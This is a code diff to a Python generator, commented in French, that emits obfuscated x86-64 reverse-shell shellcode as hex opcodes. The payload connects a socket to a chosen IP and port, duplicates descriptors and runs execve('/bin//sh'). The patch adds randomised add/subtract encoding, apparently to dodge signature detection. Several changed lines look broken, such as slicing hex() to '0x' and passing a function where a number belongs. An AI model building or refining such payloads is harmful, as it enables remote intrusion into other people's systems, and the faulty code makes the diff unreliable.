@@ -98,14 +98,13 @@ def offus(string4Payload, rand):
     return newString
 
 #Renvoit l'opcode pour soustraire ou additionnner ce qui rend la désoffuscation possible
-def deOffus(factorOffusVar):
-
+def deOffus(factorOffusVar, string_to_deof):
+    addString = ""
     #On a add donc on va re sub la différence additionnée
     if factorOffusVar < 0 :
         factorOffusVar *= -1 
         if factorOffusVar < 10 :
-            addString = ""
-            for i in range(7):
+            for i in range(1, len(string_to_deof)):
                 addString+="0"+str(factorOffusVar)
             return "4883eb"+addString
         
@@ -118,7 +117,7 @@ def deOffus(factorOffusVar):
             elif factorOffusVar == 14 : newFactor = "e"
             elif factorOffusVar == 15 : newFactor = "f"
 
-            for i in range(7):
+            for i in range(1, len(string_to_deof)):
                 addString+="0"+str(newFactor)
 
             return "4883eb"+addString
@@ -127,8 +126,7 @@ def deOffus(factorOffusVar):
     elif factorOffusVar > 0 :
         if factorOffusVar <= -10 :
 
-            addString = ""
-            for i in range(7):
+            for i in range(1, len(string_to_deof)):
                 addString+="0"+str(factorOffusVar)
 
             return "4883c3"+addString
@@ -142,7 +140,7 @@ def deOffus(factorOffusVar):
             elif factorOffusVar == 14 : newFactor = "e"
             elif factorOffusVar == 15 : newFactor = "f"
 
-            for i in range(7):
+            for i in range(1, len(string_to_deof)):
                 addString+="0"+str(newFactor)
 
             return "4883c3"+addString 
@@ -197,13 +195,13 @@ def create_socket():
 
 def socket_connect(ip, port):
    global PAYLOAD
-   tmpstring = ""
+   add_string = ""
    l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
-   tmpstring += l[r(0,len(l)-1)]   
-   clean("rax")
-   tmpstring+= "b02a" if r(0,1) else "042a"
-   PAYLOAD += clean("rbx")
-   PAYLOAD += "53" # push rbx
+   add_string += l[r(0,len(l)-1)]   
+   add_string += clean("rax")
+   add_string += "b02a" if r(0,1) else "042a"
+   add_string += clean("rbx")
+   add_string += "53" # push rbx
    ip_greater = []
    ip_to_substract = []
    cmp = 0
@@ -213,14 +211,14 @@ def socket_connect(ip, port):
     cmp += 1
     
     
-    PAYLOAD += "be" # mov esi
+    add_string += "be" # mov esi
     for i in range(0,len(ip_greater)):
         if ip_greater[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_greater[i])[:2]
         # print(hex(ip_greater[i])[2:])
 
 
-    PAYLOAD += "83ee" # sub esi
+    add_string += "83ee" # sub esi
     for i in range(0, len(ip_to_substract)):
         if ip_to_substract[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_to_substract[i])[:2]
@@ -229,12 +227,18 @@ def socket_connect(ip, port):
     #print(PAYLOAD)
     port = hex(socket.htons(int(port)))[:2]
 
-    PAYLOAD += "566668" # push
-    PAYLOAD += port[2:] + port[:2] # little endian    
-    PAYLOAD += "666a02" #AF_INET
-    PAYLOAD += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
-    PAYLOAD += "b218" # mov dl,24
-    PAYLOAD += call()
+    add_string += "566668" # push
+    add_string += port[2:] + port[:2] # little endian    
+    add_string += "666a02" #AF_INET
+    add_string += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
+    add_string += "b218" # mov dl,24
+    add_string += call()
+
+    of_string = factorOffus(add_string)
+    ofstring = factorOffusVar(add_string, of_string)
+    deof_string = deOffus(of_string, add_string)
+
+    PAYLOAD += deof_string
     return PAYLOAD
 
 def dup2x3():
@@ -279,8 +283,8 @@ def shell():
     PAYLOAD+="57" #push rdi
     PAYLOAD+="4889e6" #mov rsi, rsp
 
-    #Déoffucation   
-
+    #Déoffucation
+    PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f")   
     #Appel systeme
     PAYLOAD+="b03b" #mov al, 0x3b
     PAYLOAD+= call()
